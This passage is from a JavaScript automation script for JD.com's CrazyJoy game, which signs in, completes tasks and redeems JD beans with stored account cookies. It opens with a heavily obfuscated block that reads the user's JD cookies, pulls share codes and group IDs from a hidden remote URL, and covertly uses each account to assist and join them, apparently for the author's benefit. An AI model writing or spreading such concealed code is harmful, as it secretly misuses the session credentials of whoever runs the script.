_0x32e50a={'aJtgc':_0x2ae0('2','D#GT'),'nfIOV':_0x2ae0('3','D#GT'),'QszSx':_0x2ae0('4','D#GT'),'XJqqj':function(_0x3daca5,_0x4d2ff5){return _0x3daca5<_0x4d2ff5;},'waLkQ':function(_0x206c52,_0x2f0f8c){return _0x206c52(_0x2f0f8c);},'hzusy':function(_0x24ba95,_0x94cfeb){return _0x24ba95*_0x94cfeb;},'LgQTO':function(_0x2cc590){return _0x2cc590();},'SsfWJ':function(_0x1d4c98){return _0x1d4c98();},'oUeJn':_0x2ae0('5','SK*o'),'RLpfJ':function(_0xb748c1){return _0xb748c1();},'FZCwb':function(_0x22be98,_0x2c0126){return _0x22be98(_0x2c0126);},'NFGLz':function(_0x4e4674,_0x6b0684){return _0x4e4674+_0x6b0684;},'sevKU':function(_0x59bcfb,_0x5a291c){return _0x59bcfb!==_0x5a291c;},'FxurM':_0x2ae0('6','$!my'),'luear':function(_0x4d2b08,_0x5dba68){return _0x4d2b08(_0x5dba68);},'efyBs':function(_0xac8510,_0xb99a9c){return _0xac8510===_0xb99a9c;},'ogoAa':_0x2ae0('7','06T5'),'vMmLz':_0x2ae0('8','E^Jp')};if(!_0x32e50a[_0x2ae0('9','ivfT')](getCookies))return;$[_0x2ae0('a','xMJ9')]=[];$[_0x2ae0('b','06T5')]=[];await _0x32e50a[_0x2ae0('c','^G8&')](getAuthorShareCode);for(let _0x1e67b9=0x0;_0x32e50a[_0x2ae0('d','PotH')](_0x1e67b9,$[_0x2ae0('e','jDvh')][_0x2ae0('f','JSyo')]);_0x1e67b9++){$[_0x2ae0('10','!k2q')]=$[_0x2ae0('11','G&Hr')][_0x1e67b9];if($[_0x2ae0('12','PotH')][_0x2ae0('13','$]pq')](_0x32e50a[_0x2ae0('14','EkFq')]))await _0x32e50a[_0x2ae0('15','$!my')](getJxToken);if($[_0x2ae0('16','G&Hr')]){$[_0x2ae0('17','UHSy')]=_0x32e50a[_0x2ae0('18','cw^8')](decodeURIComponent,$[_0x2ae0('19','XKSm')][_0x2ae0('1a','ivfT')](/pt_pin=(.+?);/)&&$[_0x2ae0('1b','gip1')][_0x2ae0('1c','UHSy')](/pt_pin=(.+?);/)[0x1]);$[_0x2ae0('1d','SSNd')]=_0x32e50a[_0x2ae0('1e','CC@5')](_0x1e67b9,0x1);$[_0x2ae0('1f','JSyo')]='';$[_0x2ae0('20','SK*o')]=!![];for(let _0x2f4d34 of $[_0x2ae0('21','jXLW')]){if($[_0x2ae0('22','N^CZ')][_0x2ae0('23','t7DE')](_0x32e50a[_0x2ae0('24','kLC*')])&&!$[_0x2ae0('25','SSNd')][_0x2ae0('26','cw^8')]('%')){if(_0x32e50a[_0x2ae0('27','XKSm')](_0x32e50a[_0x2ae0('28','CC@5')],_0x32e50a[_0x2ae0('29','%x2F')])){$[_0x2ae0('2a','PotH')]=[$[_0x2ae0('2b',']2$$')](_0x32e50a[_0x2ae0('2c','E^Jp')])||'',$[_0x2ae0('2d','D#GT')](_0x32e50a[_0x2ae0('2e',']2$$')])||''];}else{await _0x32e50a[_0x2ae0('2f','y9)#')](createSuperAssistUser,_0x2f4d34);}}await _0x32e50a[_0x2ae0('30','(u4J')](createAssistUser,_0x2f4d34);await $[_0x2ae0('31','(u4J')](0x7d0);if(!$[_0x2ae0('32','JSyo')])break;}$[_0x2ae0('33','wdr8')]=!![];for(let _0x3287eb of $[_0x2ae0('34','wdr8')]){if(_0x32e50a[_0x2ae0('35','kLC*')](_0x32e50a[_0x2ae0('36','y9)#')],_0x32e50a[_0x2ae0('37','Pnao')])){let _0x4266c9=_0x32e50a[_0x2ae0('38',']2$$')];let _0x4cf3eb='';for(var _0x5f19b0=0x0;_0x32e50a[_0x2ae0('39','(u4J')](_0x5f19b0,count);_0x5f19b0++){_0x4cf3eb+=_0x4266c9[_0x32e50a[_0x2ae0('3a','AUgj')](parseInt,_0x32e50a[_0x2ae0('3b','xJJW')](Math[_0x2ae0('3c','SSNd')](),_0x4266c9[_0x2ae0('3d','cw^8')]))];}return _0x4cf3eb;}else{if($[_0x2ae0('3e','bd$L')][_0x2ae0('3f','bnHi')](_0x32e50a[_0x2ae0('40','FloN')])&&!$[_0x2ae0('41','t7DE')][_0x2ae0('42','AB[3')]('%')){await _0x32e50a[_0x2ae0('43','$]pq')](joinGroup,_0x3287eb);await $[_0x2ae0('44','SSNd')](0x7d0);if(!$[_0x2ae0('45','kLC*')])break;}}}}}})()[_0x2ae0('46','!k2q')](_0x59828f=>$[_0x2ae0('47','cw^8')](_0x59828f))[_0x2ae0('48','$7O%')](()=>$[_0x2ae0('49','gip1')]());function joinGroup(_0x44d364){var _0x55a41e={'vZQNq':_0x2ae0('4a','N^CZ'),'DyzQw':_0x2ae0('4b','06T5'),'ugXMv':_0x2ae0('4c','cw^8'),'dembD':_0x2ae0('4d','T0D#'),'ofFXg':function(_0x18aa86,_0x2f11ff){return _0x18aa86===_0x2f11ff;},'GaYpi':function(_0x4ce20c,_0x33e928){return _0x4ce20c!==_0x33e928;},'kxAfA':_0x2ae0('4e','06T5'),'ClyYI':function(_0x105299){return _0x105299();},'uCuyM':function(_0x17729a,_0x434eef){return _0x17729a(_0x434eef);},'qwEUS':function(_0x19410a){return _0x19410a();},'tRSgj':function(_0x6b4758,_0x1a8349){return _0x6b4758===_0x1a8349;},'TXInL':_0x2ae0('4f','xJJW'),'qlPIZ':function(_0x5e6cbd,_0x3b819b,_0x3372fe){return _0x5e6cbd(_0x3b819b,_0x3372fe);},'UdjHv':_0x2ae0('50','CPhn'),'horks':_0x2ae0('51','UHSy'),'OeZOm':_0x2ae0('52','N^CZ')};return new Promise(async _0x3a3288=>{var _0x2bd380={'BvJSD':function(_0x2b29d1,_0x298850){return _0x55a41e[_0x2ae0('53','N^CZ')](_0x2b29d1,_0x298850);},'vzJmw':function(_0x53225d){return _0x55a41e[_0x2ae0('54','ivfT')](_0x53225d);}};if(_0x55a41e[_0x2ae0('55','bd$L')](_0x55a41e[_0x2ae0('56','E^Jp')],_0x55a41e[_0x2ae0('57','T0D#')])){$[_0x2ae0('58','SK*o')](_0x55a41e[_0x2ae0('59','D#GT')](taskUrl,_0x2ae0('5a','UHSy'),_0x2ae0('5b','06T5')+_0x44d364+_0x2ae0('5c','SSNd')+$[_0x2ae0('5d','T0D#')][_0x55a41e[_0x2ae0('5e','!k2q')]]+_0x2ae0('5f','kLC*')+$[_0x2ae0('60','wdr8')][_0x55a41e[_0x2ae0('61','JSyo')]]+_0x2ae0('62','FloN')+$[_0x2ae0('63','!k2q')][_0x55a41e[_0x2ae0('64','$7O%')]]),(_0x1ef37f,_0x5a88a1,_0x4e2deb)=>{var _0x77b4b2={'AFvoP':_0x55a41e[_0x2ae0('65','UHSy')],'KsmyF':_0x55a41e[_0x2ae0('66','JSyo')],'cqpAJ':_0x55a41e[_0x2ae0('67','xJJW')],'fdUuj':_0x55a41e[_0x2ae0('68','H[0d')]};try{const {sErrMsg,iRet}=JSON[_0x2ae0('69','t7DE')](_0x4e2deb);if(_0x55a41e[_0x2ae0('6a','JSyo')](iRet,0x7d5)||_0x55a41e[_0x2ae0('6b','jDvh')](iRet,0x270f))$[_0x2ae0('6c','$7O%')]=![];}catch(_0x5d209a){if(_0x55a41e[_0x2ae0('6d','7]VV')](_0x55a41e[_0x2ae0('6e','UHSy')],_0x55a41e[_0x2ae0('6f','CC@5')])){if($[_0x2ae0('70','xJJW')]()){$[_0x2ae0('71','06T5')]=Object[_0x2ae0('72','H[0d')](jdCookieNode);}else{$[_0x2ae0('e','jDvh')]=[$[_0x2ae0('73','RD#*')](_0x77b4b2[_0x2ae0('74','AB[3')])||'',$[_0x2ae0('75','CPhn')](_0x77b4b2[_0x2ae0('76','AB[3')])||''];}if(!$[_0x2ae0('77','xJJW')][0x0]){$[_0x2ae0('78','$7O%')]($[_0x2ae0('79','Ix%W')],_0x77b4b2[_0x2ae0('7a','^G8&')],_0x77b4b2[_0x2ae0('7b','Pnao')],{'open-url':_0x77b4b2[_0x2ae0('7c','D#GT')]});return![];}return!![];}else{$[_0x2ae0('7d','7]VV')](_0x5d209a,_0x5a88a1);}}finally{_0x55a41e[_0x2ae0('7e','xJJW')](_0x3a3288);}});}else{let _0x281a9b=_0x2bd380[_0x2ae0('7f','$qfi')](uuid,0x28);let _0x3a22e6=(+new Date())[_0x2ae0('80','06T5')]();let _0x13be02=$[_0x2ae0('81','pvY$')][_0x2ae0('82','Pnao')](/pt_pin=(.+?);/)[0x1];let _0x16ab5e=$[_0x2ae0('83','EkFq')](''+_0x13be02+_0x3a22e6+_0x281a9b+_0x2ae0('84','XKSm'));$[_0x2ae0('85','%x2F')]={'timestamp':_0x3a22e6,'phoneid':_0x281a9b,'farm_jstoken':_0x16ab5e};_0x2bd380[_0x2ae0('86','kLC*')](_0x3a3288);}});}function getAuthorShareCode(){var _0x2811e4={'mSkgb':function(_0x2c38ac){return _0x2c38ac();},'fxEFu':function(_0xcf598e,_0x24d004){return _0xcf598e===_0x24d004;},'gsLUd':function(_0x14ef63,_0x1bd3c3){return _0x14ef63===_0x1bd3c3;},'rMqRm':function(_0x85f78e,_0xa50688){return _0x85f78e!==_0xa50688;},'mXSEG':_0x2ae0('87','XKSm'),'UUXqW':_0x2ae0('88','XbG]'),'PkFCH':_0x2ae0('89','AUgj'),'UqUWV':_0x2ae0('8a','pvY$')};return new Promise(_0x3ba0bc=>{var _0xe650a3={'XMySN':function(_0x5e1ae0){return _0x2811e4[_0x2ae0('8b','^G8&')](_0x5e1ae0);},'PnlyK':function(_0x233b36,_0x367c7f){return _0x2811e4[_0x2ae0('8c','FloN')](_0x233b36,_0x367c7f);},'ocPgN':function(_0x6b8353,_0x691b62){return _0x2811e4[_0x2ae0('8d','t7DE')](_0x6b8353,_0x691b62);}};if(_0x2811e4[_0x2ae0('8e','gip1')](_0x2811e4[_0x2ae0('8f','gip1')],_0x2811e4[_0x2ae0('90','y9)#')])){$[_0x2ae0('91','CC@5')]({'url':_0x2811e4[_0x2ae0('92','$qfi')],'headers':{'User-Agent':_0x2811e4[_0x2ae0('93','(u4J')]}},async(_0x4f9e57,_0x16e8fa,_0x5ea3af)=>{try{const {shareId,strGroupIds}=JSON[_0x2ae0('94','RD#*')](_0x5ea3af);$[_0x2ae0('95','kLC*')]=shareId;$[_0x2ae0('96','SK*o')]=strGroupIds;}catch(_0x4edad6){}finally{_0xe650a3[_0x2ae0('97','t7DE')](_0x3ba0bc);}});}else{try{const {sErrMsg,iRet}=JSON[_0x2ae0('98','xMJ9')](data);if(_0xe650a3[_0x2ae0('99','N^CZ')](iRet,0x7d5)||_0xe650a3[_0x2ae0('9a','xJJW')](iRet,0x270f))$[_0x2ae0('9b','t7DE')]=![];}catch(_0x1dc15a){$[_0x2ae0('9c','RD#*')](_0x1dc15a,resp);}finally{_0xe650a3[_0x2ae0('9d','ivfT')](_0x3ba0bc);}}});}function getCookies(){var _0x482117={'fpeRF':_0x2ae0('9e','N^CZ'),'OiAdw':function(_0x43b218,_0x30c5eb){return _0x43b218<_0x30c5eb;},'UClNc':function(_0x144d34,_0x5de530){return _0x144d34(_0x5de530);},'ygBbr':function(_0x1372dd,_0x260d75){return _0x1372dd*_0x260d75;},'fabeC':function(_0x1a6e9c){return _0x1a6e9c();},'PIEmO':function(_0x18dd88,_0x10d554){return _0x18dd88===_0x10d554;},'OqxdE':_0x2ae0('9f','jDvh'),'bhOUh':_0x2ae0('a0','EkFq'),'RUrEk':_0x2ae0('a1','!k2q'),'GlsJw':_0x2ae0('a2','$!my'),'JyVuM':function(_0x2bdbc0,_0x500e7b){return _0x2bdbc0===_0x500e7b;},'KvlSs':_0x2ae0('a3','$]pq'),'tcrBu':_0x2ae0('a4','!k2q'),'fwpxA':_0x2ae0('a5','(u4J'),'zzQAD':_0x2ae0('4d','T0D#')};if($[_0x2ae0('a6','EkFq')]()){if(_0x482117[_0x2ae0('a7','G&Hr')](_0x482117[_0x2ae0('a8','SK*o')],_0x482117[_0x2ae0('a9','$7O%')])){$[_0x2ae0('aa','pvY$')]=Object[_0x2ae0('ab','EkFq')](jdCookieNode);}else{$[_0x2ae0('ac','7]VV')]=Object[_0x2ae0('ad','bnHi')](jdCookieNode);}}else{$[_0x2ae0('ae','xMJ9')]=[$[_0x2ae0('af','pvY$')](_0x482117[_0x2ae0('b0','kLC*')])||'',$[_0x2ae0('b1','H[0d')](_0x482117[_0x2ae0('b2','SK*o')])||''];}if(!$[_0x2ae0('b3','G4eA')][0x0]){if(_0x482117[_0x2ae0('b4','SK*o')](_0x482117[_0x2ae0('b5','!k2q')],_0x482117[_0x2ae0('b6','EkFq')])){var _0x3d0fa1={'GQZAi':function(_0x464281,_0x1f4ead){return _0x482117[_0x2ae0('b7','UHSy')](_0x464281,_0x1f4ead);},'kOtbq':function(_0x4746d0){return _0x482117[_0x2ae0('b8','RD#*')](_0x4746d0);}};function _0x4c441b(_0x14ec0e){let _0x25d8fc=_0x482117[_0x2ae0('b9','CC@5')];let _0x2fd976='';for(var _0x19db55=0x0;_0x482117[_0x2ae0('ba','^G8&')](_0x19db55,_0x14ec0e);_0x19db55++){_0x2fd976+=_0x25d8fc[_0x482117[_0x2ae0('bb','xJJW')](parseInt,_0x482117[_0x2ae0('bc','f)[#')](Math[_0x2ae0('bd','^G8&')](),_0x25d8fc[_0x2ae0('be','AB[3')]))];}return _0x2fd976;}return new Promise(_0x547675=>{let _0x29d755=_0x3d0fa1[_0x2ae0('bf','ivfT')](_0x4c441b,0x28);let _0x26a6b9=(+new Date())[_0x2ae0('c0','H[0d')]();let _0x49b801=$[_0x2ae0('c1','D#GT')][_0x2ae0('c2','bd$L')](/pt_pin=(.+?);/)[0x1];let _0x23e305=$[_0x2ae0('c3','$qfi')](''+_0x49b801+_0x26a6b9+_0x29d755+_0x2ae0('c4','%x2F'));$[_0x2ae0('c5','FloN')]={'timestamp':_0x26a6b9,'phoneid':_0x29d755,'farm_jstoken':_0x23e305};_0x3d0fa1[_0x2ae0('c6','Pnao')](_0x547675);});}else{$[_0x2ae0('c7','!k2q')]($[_0x2ae0('c8','bd$L')],_0x482117[_0x2ae0('c9','gip1')],_0x482117[_0x2ae0('ca','bnHi')],{'open-url':_0x482117[_0x2ae0('cb','G4eA')]});return![];}}return!![];}function createAssistUser(_0x49feb3){var _0x1a8696={'wOqcf':function(_0x56a5e4,_0x2af75f){return _0x56a5e4===_0x2af75f;},'neuXg':function(_0x40d3d5){return _0x40d3d5();},'tTDSo':function(_0x44c3af,_0x8a931c,_0x38bab1){return _0x44c3af(_0x8a931c,_0x38bab1);},'Gzyza':_0x2ae0('cc','gip1'),'mRCNa':function(_0x56d9f0,_0xdc414f){return _0x56d9f0(_0xdc414f);}};return new Promise(_0x57bc5b=>{$[_0x2ae0('cd','!k2q')](_0x1a8696[_0x2ae0('ce','$7O%')](taskUrl,_0x1a8696[_0x2ae0('cf','PotH')],_0x2ae0('d0','AUgj')+_0x1a8696[_0x2ae0('d1','CPhn')](escape,_0x49feb3)+_0x2ae0('d2','$7O%')),async(_0x1eccb7,_0xe29542,_0x41eb9a)=>{try{const {iRet}=JSON[_0x2ae0('d3','Ix%W')](_0x41eb9a);if(_0x1a8696[_0x2ae0('d4','XbG]')](iRet,0x7d5)||_0x1a8696[_0x2ae0('d5','pvY$')](iRet,0x270f))$[_0x2ae0('d6','N^CZ')]=![];}catch(_0xe22d04){}finally{_0x1a8696[_0x2ae0('d7','N^CZ')](_0x57bc5b);}});});}function createSuperAssistUser(_0x379ab9){var _0x413179={'prwdQ':function(_0x49a636,_0x1084a9){return _0x49a636===_0x1084a9;},'sxJWX':_0x2ae0('d8','cw^8'),'NlJHm':_0x2ae0('d9','Pnao'),'gpWNq':function(_0xb590da,_0x42cd6a){return _0xb590da===_0x42cd6a;},'bDJpU':function(_0x23c1ee){return _0x23c1ee();},'cxwSk':function(_0xb9f3ad,_0x5cd109,_0x4fcb5d){return _0xb9f3ad(_0x5cd109,_0x4fcb5d);},'Kebja':_0x2ae0('da','AUgj'),'HWKgJ':_0x2ae0('db','AB[3'),'EDGXO':_0x2ae0('dc','ivfT'),'NYFwq':_0x2ae0('dd','xMJ9'),'kCQAQ':function(_0x27cb4d,_0x34106a){return _0x27cb4d(_0x34106a);}};return new Promise(_0x666bd1=>{var _0x21f5d2={'RMKym':function(_0x30d48b,_0x3acad1){return _0x413179[_0x2ae0('de','xMJ9')](_0x30d48b,_0x3acad1);},'wGnyb':function(_0x3b4d24,_0x2dcfc4){return _0x413179[_0x2ae0('df','%x2F')](_0x3b4d24,_0x2dcfc4);},'Llhqo':_0x413179[_0x2ae0('e0','jDvh')],'qBOJV':_0x413179[_0x2ae0('e1','wdr8')],'TeXjY':function(_0x2be218,_0x43a6f2){return _0x413179[_0x2ae0('e2','$qfi')](_0x2be218,_0x43a6f2);},'AChSN':function(_0x264917){return _0x413179[_0x2ae0('e3','FloN')](_0x264917);}};$[_0x2ae0('e4','E^Jp')](_0x413179[_0x2ae0('e5','G&Hr')](taskUrl,_0x413179[_0x2ae0('e6','bnHi')],_0x2ae0('e7','G&Hr')+$[_0x2ae0('e8','$!my')][_0x413179[_0x2ae0('e9','xMJ9')]]+_0x2ae0('ea','xMJ9')+$[_0x2ae0('eb','cw^8')][_0x413179[_0x2ae0('ec','T0D#')]]+_0x2ae0('ed','$7O%')+$[_0x2ae0('c5','FloN')][_0x413179[_0x2ae0('ee','SSNd')]]+_0x2ae0('ef','$qfi')+_0x413179[_0x2ae0('f0','7]VV')](escape,_0x379ab9)+_0x2ae0('f1','E^Jp')),async(_0x405960,_0x1e3eb4,_0x20cb7e)=>{try{if(_0x21f5d2[_0x2ae0('f2','jDvh')](_0x21f5d2[_0x2ae0('f3','$7O%')],_0x21f5d2[_0x2ae0('f4','f)[#')])){const {sErrMsg,iRet}=JSON[_0x2ae0('f5','SSNd')](_0x20cb7e);if(_0x21f5d2[_0x2ae0('f6','(u4J')](iRet,0x7d5)||_0x21f5d2[_0x2ae0('f7','CC@5')](iRet,0x270f))$[_0x2ae0('f8','(u4J')]=![];}else{const {sErrMsg,iRet}=JSON[_0x2ae0('f9','AUgj')](_0x20cb7e);if(_0x21f5d2[_0x2ae0('fa','AUgj')](iRet,0x7d5)||_0x21f5d2[_0x2ae0('fb','t7DE')](iRet,0x270f))$[_0x2ae0('fc','!k2q')]=![];}}catch(_0x49cafc){$[_0x2ae0('fd','PotH')](_0x49cafc,_0x1e3eb4);}finally{_0x21f5d2[_0x2ae0('fe','cw^8')](_0x666bd1);}});});}function taskUrl(_0x3a198e,_0x591b21){var _0x10a086={'OCTuU':_0x2ae0('ff','CPhn'),'WQxaL':_0x2ae0('100','UHSy'),'gxAlX':_0x2ae0('101','H[0d'),'SHZgu':_0x2ae0('102','$!my'),'jMnPx':_0x2ae0('103','$T0&'),'PoKga':function(_0x3888a3,_0x4bf2d4){return _0x3888a3+_0x4bf2d4;},'AkkvV':function(_0x1e6689,_0x306012){return _0x1e6689*_0x306012;},'cmAhk':_0x2ae0('104','ivfT')};return{'url':_0x2ae0('105','xMJ9')+_0x3a198e+_0x2ae0('106','E^Jp')+Date[_0x2ae0('107','SK*o')]()+_0x2ae0('108','bd$L')+_0x591b21+_0x2ae0('109','wdr8')+Date[_0x2ae0('10a','bnHi')]()+_0x2ae0('10b','T0D#'),'headers':{'Cookie':$[_0x2ae0('10c','$qfi')],'Accept':_0x10a086[_0x2ae0('10d','jXLW')],'Connection':_0x10a086[_0x2ae0('10e','bnHi')],'Referer':_0x10a086[_0x2ae0('10f','SK*o')],'Accept-Encoding':_0x10a086[_0x2ae0('110','xMJ9')],'Host':_0x10a086[_0x2ae0('111','06T5')],'User-Agent':_0x2ae0('112','kLC*')+_0x10a086[_0x2ae0('113','N^CZ')](_0x10a086[_0x2ae0('114','JSyo')](Math[_0x2ae0('115','wdr8')],0x62),0x1)+_0x2ae0('116','wdr8'),'Accept-Language':_0x10a086[_0x2ae0('117','D#GT')]}};}function getJxToken(){var _0x378a40={'DsMnq':_0x2ae0('118','XKSm'),'titBf':function(_0x222842,_0x35d722){return _0x222842<_0x35d722;},'wjKcu':function(_0x22414f,_0x31e422){return _0x22414f(_0x31e422);},'RDbCV':function(_0x572667,_0x1751c2){return _0x572667*_0x1751c2;},'uvdBa':function(_0x2d5b3d,_0x81619a){return _0x2d5b3d(_0x81619a);},'nUHti':function(_0x4c2e17){return _0x4c2e17();}};function _0x1fc971(_0x281e07){let _0x270cbb=_0x378a40[_0x2ae0('119','FloN')];let _0x51fb57='';for(var _0xfa499=0x0;_0x378a40[_0x2ae0('11a','$]pq')](_0xfa499,_0x281e07);_0xfa499++){_0x51fb57+=_0x270cbb[_0x378a40[_0x2ae0('11b','ivfT')](parseInt,_0x378a40[_0x2ae0('11c','t7DE')](Math[_0x2ae0('11d','f)[#')](),_0x270cbb[_0x2ae0('11e','D#GT')]))];}return _0x51fb57;}return new Promise(_0x5d94e7=>{let _0x599130=_0x378a40[_0x2ae0('11f','jDvh')](_0x1fc971,0x28);let _0x4393f2=(+new Date())[_0x2ae0('120','AUgj')]();let _0x48515a=$[_0x2ae0('121','xMJ9')][_0x2ae0('c2','bd$L')](/pt_pin=(.+?);/)[0x1];let _0x4f8490=$[_0x2ae0('122',']2$$')](''+_0x48515a+_0x4393f2+_0x599130+_0x2ae0('123','XbG]'));$[_0x2ae0('c5','FloN')]={'timestamp':_0x4393f2,'phoneid':_0x599130,'farm_jstoken':_0x4f8490};_0x378a40[_0x2ae0('124','SK*o')](_0x5d94e7);});};_0xodR='jsjiami.com.v6';
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdCrazyJoy() {
  $.coin = 0
  $.bean = 0
  await getUserInfo($.nextCode)
  await doSign()
  // 助力好友
  await helpFriends()
  await doTasks()
  await getGrowthReward();//领取解锁的等级奖励
  await getCoin()
  await getUserBean()
  if ( applyJdBean!==0 && applyJdBean<=$.bean){
    await $.wait(1000)
    console.log(`检测您打开了自动兑换开关，去兑换京豆`)
    await doApplyJdBean(applyJdBean)
  }
  await getSpecialJoy();
  await showMsg();
}
async function doTasks() {
  await getTaskInfo()
  for (let j = 0; j < $.taskList.length; ++j) {
    let task = $.taskList[j];
    if (task['taskTypeId'] === 102) {
      message += `${task.taskTitle}：${task['doneTimes']}/${task.ext.count}\n`;
    }
    if (task.status === 0 && task.taskTypeId === 103)
      for (let i = task.doneTimes; i < task.ext.count; ++i) {
        await doTask(task.taskId)
      }
    if (task.status === 2)
      await awardTask(task.taskId)
  }
}
function doApplyJdBean(bean = 1000) {
  // 兑换京豆
  let body = {"paramData":{"bean":bean}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_applyJdBeanPaid', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`兑换${bean}京豆成功`)
              message += `兑换京豆：${bean}京豆成功\n`;
            } else {
              console.log(`兑换${bean}京豆失败，错误信息：${data.resultTips||data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo(code) {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb243f=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let body={"\x70\x61\x72\x61\x6D\x44\x61\x74\x61":{"\x69\x6E\x76\x69\x74\x65\x72":code}};(function(_0xaddbx2,_0xaddbx3,_0xaddbx4,_0xaddbx5,_0xaddbx6,_0xaddbx7){_0xaddbx7= __Oxb243f[0x0];_0xaddbx5= function(_0xaddbx8){if( typeof alert!== _0xaddbx7){alert(_0xaddbx8)};if( typeof console!== _0xaddbx7){console[__Oxb243f[0x1]](_0xaddbx8)}};_0xaddbx4= function(_0xaddbx9,_0xaddbx2){return _0xaddbx9+ _0xaddbx2};_0xaddbx6= _0xaddbx4(__Oxb243f[0x2],_0xaddbx4(_0xaddbx4(__Oxb243f[0x3],__Oxb243f[0x4]),__Oxb243f[0x5]));try{_0xaddbx2= __encode;if(!( typeof _0xaddbx2!== _0xaddbx7&& _0xaddbx2=== _0xaddbx4(__Oxb243f[0x6],__Oxb243f[0x7]))){_0xaddbx5(_0xaddbx6)}}catch(e){_0xaddbx5(_0xaddbx6)}})({})
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_gameState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.userInviteCode) {
              console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${data.data.userInviteCode}`)
              $.selfCodes.push(data.data.userInviteCode)
              $.nextCode = data.data.userInviteCode
              message += `${data.data['nickName']}：${data.data['userTopLevelJoyId']}级JOY\n`;
            }
            else
              console.log(`用户信息获取失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

async function helpFriends() {
  let codes = $.newShareCodes.concat($.selfCodes)
  for (let code of codes) {
    if (!code) continue
    await helpFriend(code)
    await $.wait(500)
  }
}

function getTaskInfo() {
  let body = {"paramData": {"taskType": "DAY_TASK"}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_getTaskState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        $.taskList = []
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.length) {
              $.taskList = data.data;
            } else {
              console.log(`任务信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doSign() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_doSign'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data) {
              console.log(`签到成功，获得${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(data.message)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doTask(taskId) {
  let body = {"action": "MARK", "taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskRecordId) {
              console.log(`去做任务【${data.data.taskTitle}】，任务id: ${data.data.taskRecordId}`)
              await $.wait(30000)
              await recordTask(taskId, data.data.taskRecordId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function recordTask(taskId, taskRecordId) {
  let body = {"action": "INCREASE", "taskId": taskId, "taskRecordId": taskRecordId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`任务【${data.data.taskTitle}】记录成功，去领奖`)
              await awardTask(taskId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function awardTask(taskId) {
  let body = {"taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskTitle) {
              console.log(`任务【${data.data.taskTitle}】领奖成功，任务奖励：${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(`任务领奖信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function helpFriend(code) {
  let body = {"paramData": {"inviter": code}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_recordAssist', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
